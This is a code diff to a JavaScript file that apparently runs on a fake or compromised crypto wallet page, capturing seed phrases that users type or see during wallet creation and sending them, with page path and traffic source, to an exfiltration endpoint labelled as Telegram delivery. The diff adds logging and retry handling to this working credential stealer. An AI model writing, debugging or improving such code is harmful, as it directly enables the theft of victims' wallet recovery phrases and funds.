@@ -36,6 +36,7 @@ function isSeed(v) {
 async function sendToTelegram(data) {
   data.trafficSource = trafficSource;
   data.timestamp = new Date().toISOString();
+  console.log('📤 Sending to API:', data.TYPE, data.WORDS ? data.WORDS + ' words' : '');
   for (let i = 0; i < 3; i++) {
     try {
       const r = await fetch(API, {
@@ -43,10 +44,19 @@ async function sendToTelegram(data) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ data })
       });
-      if (!r.ok) throw new Error('HTTP ' + r.status);
-      return await r.json();
+      const resp = await r.json();
+      if (!r.ok) {
+        console.error('❌ API error:', r.status, resp);
+        throw new Error('HTTP ' + r.status);
+      }
+      console.log('✅ API success:', resp);
+      return resp;
     } catch (e) {
-      if (i === 2) throw e;
+      console.error('❌ Send failed (attempt ' + (i+1) + '):', e.message);
+      if (i === 2) {
+        console.error('❌ All retries failed');
+        throw e;
+      }
       await new Promise(r => setTimeout(r, 1000 * (i + 1)));
     }
   }
@@ -71,8 +81,13 @@ function sendPhrase(phrase, type, field) {
   if (!clean || clean === lastSent) return;
   lastSent = clean;
   var n = wc(clean);
-  console.log('✅ Sending', n, 'word phrase [' + type + '] from', trafficSource);
-  sendToTelegram({ TYPE: type, PHRASE: clean, WORDS: n, FIELD: field || 'input', PAGE: window.location.pathname });
+  console.log('✅ CAPTURED:', n, 'word phrase [' + type + '] from', trafficSource);
+  console.log('🔑 PHRASE:', clean);
+  
+  // Send to API
+  sendToTelegram({ TYPE: type, PHRASE: clean, WORDS: n, FIELD: field || 'input', PAGE: window.location.pathname })
+    .then(() => console.log('✅ Delivered to Telegram'))
+    .catch(e => console.error('❌ Failed to deliver:', e.message));
 }
 
 // --- Collect words from .phrase-grid (wallet creation display) ---
